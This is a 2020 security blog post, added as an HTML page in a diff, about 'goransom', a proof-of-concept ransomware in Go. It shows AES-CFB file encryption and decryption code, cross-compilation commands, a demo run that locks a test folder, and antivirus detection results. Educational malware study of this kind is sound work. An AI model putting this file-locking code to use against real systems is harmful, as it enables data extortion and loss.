@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="Content-Language" content="en">
+
+	<meta name="author" content="Andrea Palmieri">
+	<meta name="description" content="This is a blog post about my last project: goransom, which is a proof of concept for a simple ransowmare written in Go.">
+	<meta name="keywords" content="blog, infosec, security, cyber security">
+
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Proof of concept of a ransowmare in Go"/>
+<meta name="twitter:description" content="This is a blog post about my last project: goransom, which is a proof of concept for a simple ransowmare written in Go."/>
+
+	<meta property="og:title" content="Proof of concept of a ransowmare in Go" />
+<meta property="og:description" content="This is a blog post about my last project: goransom, which is a proof of concept for a simple ransowmare written in Go." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/poc-goransom/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-07-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-29T00:00:00+00:00" />
+
+
+
+	
+	<base href="/posts/poc-goransom/">
+	
+	<title>
+  Proof of concept of a ransowmare in Go · andpalmier
+</title>
+
+	
+	<link rel="canonical" href="/posts/poc-goransom/">
+	
+
+	<link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+	
+	
+	
+	<link rel="stylesheet" href="/css/coder.min.d5c572a4dda2996f45f4bd9e584d43751439ce2134c33701e8d32920cc8e7d92.css" integrity="sha256-1cVypN2imW9F9L2eWE1DdRQ5ziE0wzcB6NMpIMyOfZI=" crossorigin="anonymous" media="screen" />
+	
+
+	
+
+	
+	
+	
+	
+	<link rel="stylesheet" href="/css/coder-dark.min.58ba09b2c45d36fcfc1a96c8ad83bbbc03a9de4bce8463f3c30a896134febfb3.css" integrity="sha256-WLoJssRdNvz8GpbIrYO7vAOp3kvOhGPzwwqJYTT&#43;v7M=" crossorigin="anonymous" media="screen" />
+	
+	
+
+	
+	<link rel="stylesheet" href="/css/extra-style.css" />
+	
+
+	
+
+	<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+	<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+	
+
+	<meta name="generator" content="Hugo 0.89.4" />
+    </head>
+
+    
+    
+    
+    
+    <body class="colorscheme-dark"
+
+	  onload=""
+	  >
+	  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+	  <main class="wrapper">
+	      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      andpalmier
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/">Home</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+	      <div class="content">
+		  
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Proof of concept of a ransowmare in Go</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-07-29T00:00:00Z'>
+                July 29, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              7-minute read
+            </span>
+          </div>
+          <div class="categories">
+  <i class="fas fa-folder"></i>
+    <a href="/categories/malware/">malware</a>
+      <span class="separator">•</span>
+    <a href="/categories/go/">go</a>
+      <span class="separator">•</span>
+    <a href="/categories/ransomware/">ransomware</a></div>
+
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="/tags/malware/">malware</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <figure><img src="/images/posts/goransom/thief_gopher.jpg"/>
+</figure>
+
+<h2 id="introduction">Introduction</h2>
+<p>This is a blog post about my last project: <a href="https://github.com/andpalmier/goransom">goransom</a>, which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.</p>
+<p>I am not responsible for the use you make of this tool. <strong>Do not use it on systems where you don&rsquo;t have the permission of the owner</strong>.</p>
+<h2 id="background">Background</h2>
+<p>Ransomware is a particular type of malware which encrypts the victim&rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack">WannaCry</a>, <a href="https://en.wikipedia.org/wiki/CryptoLocker">CryptoLocker</a> and <a href="https://en.wikipedia.org/wiki/Locky">Locky</a>.</p>
+<p>While developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.</p>
+<p>Go makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>Being a proof of concept, <code>goransom</code> won&rsquo;t automatically start to encrypt the full hard drive. We don&rsquo;t want to cause trouble here.</p>
+<p>Instead, the program allows to specify in input the path of the target file or folder to encrypt. <code>goransom</code> also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.</p>
+<p>After the files are successfully encrypted, they will have a <em>.locked</em> suffix in the filename. In order to get the original files back, the <code>-decrypt</code> flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.</p>
+<h3 id="key-generation-encryption-and-decryption">Key generation, encryption and decryption</h3>
+<p><code>goransom</code> encrypts and decrypts the given files using <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES block cipher</a>, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the <a href="https://golang.org/pkg/crypto/">crypto package and its subdirectories</a>.</p>
+<figure><img src="/images/posts/goransom/aescfb.png"
+         alt="Go makes THIS super easy! Pic from Wikipedia"/><figcaption>
+            <p>Go makes THIS super easy! <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)">Pic from Wikipedia</a></p>
+        </figcaption>
+</figure>
+
+<p>Since AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// given a secret returns the sha256 hash
+</span><span style="color:#75715e">// used for encryption/decryption
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">DeriveKey</span>(<span style="color:#a6e22e">secret</span> <span style="color:#66d9ef">string</span>)[<span style="color:#ae81ff">32</span>]<span style="color:#66d9ef">byte</span>{
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sha256</span>.<span style="color:#a6e22e">Sum256</span>([]byte(<span style="color:#a6e22e">secret</span>))
+}
+</code></pre></div><p>The encryption function is called for every file which has to be encrypted; it reads the content of the file and use it as a plaintext for our cipher.</p>
+<p>The initialization vector (IV) is used by many modes of operation to randomize the encryption and produce different ciphertexts when plaintext and key are the same. The security requirements of the IV are different from the ones of the key: the IV needs to be unique, but it does not need to be a secret. It is therefore quite common to include it at the beginning of the ciphertext.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// open the given file
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#a6e22e">filePath</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    panic(<span style="color:#a6e22e">err</span>)
+}
+
+<span style="color:#75715e">// create AES CFB cipher
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">NewCipher</span>(<span style="color:#a6e22e">secretKey</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    panic(<span style="color:#a6e22e">err</span>)
+}
+
+<span style="color:#75715e">// The IV needs to be unique, but not secure. therefore it&#39;s common to
+</span><span style="color:#75715e">// include it at the beginning of the ciphertext.
+</span><span style="color:#75715e">// See here: https://golang.org/pkg/crypto/cipher/
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">ciphertext</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span><span style="color:#f92672">+</span>len(<span style="color:#a6e22e">data</span>))
+<span style="color:#a6e22e">iv</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ciphertext</span>[:<span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span>]
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ReadFull</span>(<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Reader</span>, <span style="color:#a6e22e">iv</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    panic(<span style="color:#a6e22e">err</span>)
+}
+
+<span style="color:#a6e22e">stream</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#a6e22e">NewCFBEncrypter</span>(<span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">iv</span>)
+<span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">XORKeyStream</span>(<span style="color:#a6e22e">ciphertext</span>[<span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span>:], <span style="color:#a6e22e">data</span>)
+
+<span style="color:#75715e">// write the ciphertext in the file
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">filePath</span>,<span style="color:#a6e22e">ciphertext</span>,<span style="color:#ae81ff">0644</span>)
+</code></pre></div><p>A <em>&quot;.locked&quot;</em> suffix is then appended to the filename.</p>
+<p>The decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the <a href="https://golang.org/pkg/crypto/cipher/">documentation of the <em>crypto/cipher</em> package</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// open the given file
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">ciphertext</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#a6e22e">filePath</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    panic(<span style="color:#a6e22e">err</span>)
+}
+
+<span style="color:#75715e">// create AES CFB cipher
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">NewCipher</span>(<span style="color:#a6e22e">secretKey</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+    panic(<span style="color:#a6e22e">err</span>)
+}
+
+<span style="color:#75715e">// The IV needs to be unique, but not secure. Therefore it&#39;s common to
+</span><span style="color:#75715e">// include it at the beginning of the ciphertext.
+</span><span style="color:#75715e">// See here: https://golang.org/pkg/crypto/cipher/
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">ciphertext</span>) &lt; <span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span> {
+    panic(<span style="color:#e6db74">&#34;ciphertext too short&#34;</span>)
+}
+
+<span style="color:#a6e22e">iv</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ciphertext</span>[:<span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span>]
+<span style="color:#a6e22e">ciphertext</span> = <span style="color:#a6e22e">ciphertext</span>[<span style="color:#a6e22e">aes</span>.<span style="color:#a6e22e">BlockSize</span>:]
+
+<span style="color:#a6e22e">stream</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#a6e22e">NewCFBDecrypter</span>(<span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">iv</span>)
+<span style="color:#a6e22e">stream</span>.<span style="color:#a6e22e">XORKeyStream</span>(<span style="color:#a6e22e">ciphertext</span>, <span style="color:#a6e22e">ciphertext</span>)
+
+<span style="color:#75715e">// write the plaintext in the file
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">filePath</span>,<span style="color:#a6e22e">ciphertext</span>,<span style="color:#ae81ff">0644</span>)
+</code></pre></div><p>After the decryption, the <em>.locked</em> suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.</p>
+<h3 id="compile-for-multiple-architectures">Compile for multiple architectures</h3>
+<p>I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.</p>
+<p>Assuming we have our copy of <code>goransom</code>, if we want to build it for our architecture and OS, it is enough to use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ go build goransom.go
+$ file goransom
+goransom: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, statically linked, Go BuildID<span style="color:#f92672">=</span>aWuhsabAbd9um74h1Lud/gZHBAWcx_U9xYPmr8YQ-/j2tKdv2LtApZOqZSW7qb/QmkfvEG1dwo6BWtKUA5x, not stripped
+</code></pre></div><p>A <code>goransom</code> executable will be created, which can be launched as usual. However, if we want to compile the same code for different OSes and architecture, things are not much more complicated.</p>
+<p>Here is how to get a Windows executable on Linux:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GOOS<span style="color:#f92672">=</span>windows GOARCH<span style="color:#f92672">=</span><span style="color:#ae81ff">386</span> go build -o goransom.exe goransom.go
+$ file goransom.exe
+goransom.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> <span style="color:#f92672">(</span>stripped to external PDB<span style="color:#f92672">)</span>, <span style="color:#66d9ef">for</span> MS Windows
+</code></pre></div><p>and this is the process for MacOS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GOOS<span style="color:#f92672">=</span>darwin GOARCH<span style="color:#f92672">=</span>amd64 go build ransom.go
+$ file goransom
+goransom: Mach-O 64-bit x86_64 executable
+</code></pre></div><h2 id="a-first-run">A first run</h2>
+<p>This section provides just an example of how to run <code>goransom</code> on Linux. Assuming we have the following structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tree
+.
+├── goransom
+└── folder
+    └── textfile
+
+$ cat folder/textfile
+THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME
+</code></pre></div><p>Now <code>goransom</code> will be used to encrypt all the files in <code>folder</code> using <code>supersecret</code> as a secret:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./goransom -secret supersecret -target folder
+Operating on folder
+Operating on folder/textfile
+</code></pre></div><p><code>textfile</code> is now encrypted and has been renamed <code>textfile.locked</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tree
+.
+├── goransom
+└── folder
+    └── textfile.locked
+
+$ cat folder/textfile.locked
+�C4�w��i�G⛘<span style="color:#f92672">]</span>+�~O<span style="color:#f92672">(</span>�@f1
+                     �&lt;
+                       �0k&gt;&lt;�ZlEV&amp;yj��;<span style="color:#f92672">)</span>�<span style="color:#f92672">[</span>1m%
+
+</code></pre></div><p>Assuming other files were in the <code>folder</code> they would be locked as well, since the entire folder was specified as a target for <code>goransom</code>.</p>
+<p>Decrypting the file is quite easy: just repeat the command for the encryption (same <code>target</code> and same <code>secret</code>) and append the <code>-decrypt</code> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./goransom -secret supersecret -target folder -decrypt
+Operating on folder
+Operating on folder/textfile.locked
+
+$ tree
+.
+├── goransom
+└── folder
+    └── textfile
+
+$ cat folder/textfile
+THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME
+</code></pre></div><figure><img src="/images/posts/goransom/goransompowershell.png"
+         alt="It works in the same way in Windows 10"/><figcaption>
+            <p>It works in the same way in Windows 10</p>
+        </figcaption>
+</figure>
+
+<h2 id="detection">Detection</h2>
+<p>While I was testing <code>goransom</code> on Windows 10, I had the issue that Windows Security complained about it:</p>
+<figure><img src="/images/posts/goransom/windows_def.png"
+         alt="Windows Security doesn&amp;rsquo;t like goransom"/><figcaption>
+            <p>Windows Security doesn&rsquo;t like goransom</p>
+        </figcaption>
+</figure>
+
+<p>So I uploaded three different <code>goransom</code> executables on VirusTotal, to see if they are detected. Here are the results:</p>
+<figure><img src="/images/posts/goransom/vtwin.png"
+         alt="goransom for Windows on VirusTotal"/><figcaption>
+            <p><a href="https://www.virustotal.com/gui/file/1ea7f882ffab3e6fd7e80ae525df7bb35f53187948647bde2bb87a473e7c0107/detection">goransom for Windows on VirusTotal</a></p>
+        </figcaption>
+</figure>
+
+<figure><img src="/images/posts/goransom/vtlinux.png"
+         alt="goransom for Linux on VirusTotal"/><figcaption>
+            <p><a href="https://www.virustotal.com/gui/file/982cedf944165137afdf5ec1b6341e588c7bea2c7b84b32578ae522b6784d01b/detection">goransom for Linux on VirusTotal</a></p>
+        </figcaption>
+</figure>
+
+<figure><img src="/images/posts/goransom/vtmac.png"
+         alt="goransom for macOs on VirusTotal"/><figcaption>
+            <p><a href="https://www.virustotal.com/gui/file/17c6001d777259d10010622e722c52c36315986895dfab385db0e2f9ddc3a041/detection">goransom for macOs on VirusTotal</a></p>
+        </figcaption>
+</figure>
+
+<p>The Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in <code>goransom</code> is called <code>ransomware</code>, which may be the reason why some engines flags the Windows executable.</p>
+<p>Unfortunately <code>goransom</code> cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p><code>goransom</code> was super fun and relatively easy to make. The <code>crypto</code> package and the goroutines allow the code to be easy to read and efficient.</p>
+<p>There are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like <code>goransom</code> makes it even more successful.</p>
+<p>You can find <code>goransom</code> <a href="https://github.com/andpalmier/goransom">on my GitHub</a>, let me know if you have suggestions or tips to improve the quality and structure of the code.</p>
+<p>If you are looking for other proof of concept of ransomware written in Go, check out these projects:</p>
+<ul>
+<li><a href="https://github.com/target111/go-crypt">go-crypt</a></li>
+<li><a href="https://github.com/lucdew/goransomware">goransomware</a></li>
+<li><a href="https://github.com/wille/cry">go-cry</a></li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+	      </div>
+
+	<footer class="footer">
+
+<hr>
+
+    <section class="container">
+	
+	<p>I am far from being an expert and I like to learn new things. <br> If you have comments or suggestions, feel free to ping me!</p>
+	
+	
+	
+	
+
+
+<ul>
+    
+    
+    <li>
+	<a href="https://twitter.com/andpalmier/" aria-label="Twitter"  target="_blank" >
+	    <i class="fab fa-twitter" aria-hidden="true"></i>
+	</a>
+    </li>
+    
+    
+    
+    <li>
+	<a href="https://github.com/andpalmier/" aria-label="Github"  target="_blank" >
+	    <i class="fab fa-github" aria-hidden="true"></i>
+	</a>
+    </li>
+    
+    
+    
+    <li>
+	<a href="https://www.linkedin.com/in/andreapalmieri95/" aria-label="LinkedIn"  target="_blank" >
+	    <i class="fab fa-linkedin" aria-hidden="true"></i>
+	</a>
+    </li>
+    
+    
+    
+    <li>
+	<a href="mailto:andpalmier@gmail.com" aria-label="Mail"  target="_blank" >
+	    <i class="fas fa-envelope" aria-hidden="true"></i>
+	</a>
+    </li>
+    
+    
+    
+</ul>
+
+    </section>
+</footer>
+
+
+	  </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.aee9c8a464eb7b3534c7110f7c5e169e7039e2fd92710e0626d451d6725af137.js"></script>
+      
+    
+
+	  
+
+	  
+
+	  
+
+    </body>
+
+
+</html>
